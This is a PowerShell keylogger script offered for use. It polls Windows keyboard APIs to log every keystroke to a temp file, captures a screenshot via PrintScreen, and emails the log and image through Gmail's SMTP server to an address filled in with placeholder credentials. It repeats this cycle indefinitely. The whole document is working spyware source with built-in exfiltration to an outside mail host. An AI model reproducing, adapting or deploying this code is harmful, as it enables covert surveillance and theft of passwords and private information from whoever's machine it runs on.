# This script will send you all typed keys with printscreen every 10 minutes.
function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
while($true){
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {

   #please specify time and default is 20 seconds. That's 1200, but now is this 36000. 
    $time = 0
    while($time -lt 72000) {
    # 72000 ~ 10 minutes

    $time
    $time++
      Start-Sleep -Milliseconds 2
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    
    [void][reflection.assembly]::loadwithpartialname("system.windows.forms")
    [system.windows.forms.sendkeys]::sendwait('{PRTSC}')
    Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList "c:\temp\screenshot.png"
    
    # please specify your email info
    $data = Get-Content "$Path" 
    $emailSmtpServer = "smtp.gmail.com"
    $emailSmtpServerPort = "587"
    # enter sending email & password down there!
    $emailSmtpUser = "test@test.com"
    $emailSmtpPass = "testpassword"
 
    $emailMessage = New-Object System.Net.Mail.MailMessage
    # enter sending email
    $emailMessage.From = "test@test.com"
    # enter getting email
    $emailMessage.To.Add( "test@test.com" )
    $emailMessage.Subject = $env:computername
    #$emailMessage.IsBodyHtml = $true
    $emailMessage.Body = $data
    $attachment = "C:\temp\screenshot.png"
    $emailMessage.Attachments.Add( $attachment )
    $SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort )
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );
 
    $SMTPClient.Send( $emailMessage ) 
    $emailMessage.Dispose()
    Remove-Item 'C:\temp\screenshot.png'
  }
}
}
# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
Start-KeyLogger
